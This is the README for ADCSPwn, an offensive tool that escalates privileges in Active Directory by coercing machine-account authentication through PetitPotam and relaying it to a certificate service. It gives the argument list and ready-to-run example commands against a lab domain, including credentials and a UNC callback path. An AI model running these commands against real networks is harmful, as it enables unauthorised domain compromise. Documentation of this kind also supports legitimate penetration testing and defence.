# ADCSPwn

A tool to escalate privileges in an active directory network by coercing authenticate from machine accounts (Petitpotam) and relaying to the certificate service.

## Usage

Run `ADCSPwn` on your target network.

```
Author: @_batsec_ - MDSec ActiveBreach
Contributor: @Flangvik -  TrustedSec

adcspwn.exe --adcs <cs server> --port [local port] --remote [computer]

Required arguments:
adcs            -       This is the address of the AD CS server which authentication will be relayed to.

Optional arguments:
port            -       The port ADCSPwn will listen on.
remote          -       Remote machine to trigger authentication from.
username        -       Username for non-domain context.
password        -       Password for non-domain context.
dc              -       Domain controller to query for Certificate Templates (LDAP).
unc             -       Set custom UNC callback path for EfsRpcOpenFileRaw (Petitpotam) .
output          -       Output path to store base64 generated crt.

Example usage:
adcspwn.exe --adcs cs.pwnlab.local
adcspwn.exe --adcs cs.pwnlab.local --port 9001
adcspwn.exe --adcs cs.pwnlab.local --remote dc.pwnlab.local
adcspwn.exe --adcs cs.pwnlab.local --remote dc.pwnlab.local --port 9001
adcspwn.exe --adcs cs.pwnlab.local --remote dc.pwnlab.local --output C:\Temp\cert_b64.txt
adcspwn.exe --adcs cs.pwnlab.local --remote dc.pwnlab.local --username pwnlab.local\mranderson --password The0nly0ne! --dc dc.pwnlab.local
adcspwn.exe --adcs cs.pwnlab.local --remote dc.pwnlab.local --dc dc.pwnlab.local --unc \\WIN-WORK01.pwnlab.local\made\up\share
```